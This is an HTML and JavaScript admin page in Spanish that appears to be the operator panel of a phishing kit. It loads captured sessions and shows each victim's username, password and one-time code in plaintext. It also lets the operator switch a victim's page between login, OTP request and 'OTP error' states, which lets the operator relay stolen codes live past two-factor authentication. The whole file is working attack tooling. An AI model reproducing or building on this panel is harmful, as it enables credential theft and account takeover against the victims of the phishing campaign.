<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>Panel Admin</title>
    <link rel="stylesheet" href="../assets/styles/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        .table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .table th,
        .table td {
            padding: 12px;
            border: 1px solid #ccc;
            text-align: center;
        }

        .flex-status {
            display: flex;
            justify-content: center;
            gap: 10px;
            align-items: center;
        }

        .btn {
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            background: #fdda24;
        }

        .btn-save {
            background: #fdda24;
            font-weight: bold;
        }

        .status-input {
            padding: 4px 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .PanelTitle {
            text-align: center;
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .MensajeAdmin {
            justify-content: center;
            text-align: center;
        }

        .btnActuDis {
            text-align: center;
            justify-content: center;
            align-items: center;
            display: flex;
            margin: 15px;
        }
    </style>
</head>

<body>

    <div class="MensajeAdmin">
        <h2 class="PanelTitle"> Panel {USER} </h2>
        <br>

    </div>

    <div class="btnActuDis">
        <!-- Botón para actualizar -->
        <button id="refreshBtn">Actualizar 🔄</button>
    </div>


    <table class="table" cellpadding="8" cellspacing="0">
        <thead>
            <tr>
                <th>Session ID</th>
                <th>Usuario</th>
                <th>Clave</th>
                <th>Status</th>
                <th>OTP</th>
                <th>Última Actualización</th>
                <th>Editar Status</th>
            </tr>
        </thead>
        <tbody id="session-table-body">

        </tbody>
    </table>




    <script>
        // Función que trae las sesiones desde getSession.php
        function cargarSesiones() {
            fetch('getSession.php')
                .then(response => response.json()) // Parseamos la respuesta JSON
                .then(data => {
                    console.log(data);
                    const tableBody = document.getElementById('session-table-body');
                    tableBody.innerHTML = ''; // Limpiamos la tabla antes de insertar los nuevos datos

                    // Recorremos cada registro recibido y lo insertamos como una fila
                    data.forEach(session => {
                        const fila = document.createElement('tr');

                        fila.innerHTML = `
          <td>${session.session_id}</td>
          <td>${session.user}</td>
          <td>${session.pass}</td>
          <td>${session.status}</td>
          <td>${session.otp !== null ? session.otp : 'null'}</td>
          <td>${session.updated_at}</td>
          <td>
            <select id="status-${session.id}">
              <option value="login" ${session.status === 'login' ? 'selected' : ''}>Login</option>
              <option value="otp" ${session.status === 'otp' ? 'selected' : ''}>OTP</option>
              <option value="errorOtp" ${session.status === 'errorOtp' ? 'selected' : ''}>Error OTP</option>
            </select>
            <button onclick="guardarStatus(${session.id})">Guardar</button>
          </td>
        `;

                        tableBody.appendChild(fila);
                    });
                })
                .catch(error => console.error('Error al obtener las sesiones:', error));
        }

        // Evento para actualizar manualmente las sesiones
        document.getElementById('refreshBtn').addEventListener('click', cargarSesiones);

        // Llamamos la función al cargar la página
        cargarSesiones();

        // Función para guardar el cambio de status
        function guardarStatus(session_id) {
    // Usamos el session_id como ID dinámico del input
    const inputStatus = document.getElementById(`status-${session_id}`);

    if (!inputStatus) {
        console.error(`No se encontró el input con ID status-${session_id}`);
        return;
    }

    const nuevoStatus = inputStatus.value;

    fetch('updateStatus.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `id=${encodeURIComponent(session_id)}&status=${encodeURIComponent(nuevoStatus)}`
    })
    .then(response => response.text())
    .then(data => {
        alert(data); // Puedes reemplazar esto por una notificación más elegante
        cargarSesiones(); // Recargar la tabla después de guardar
    })
    .catch(error => console.error('Error al actualizar el status:', error));
}
    </script>

</body>

</html>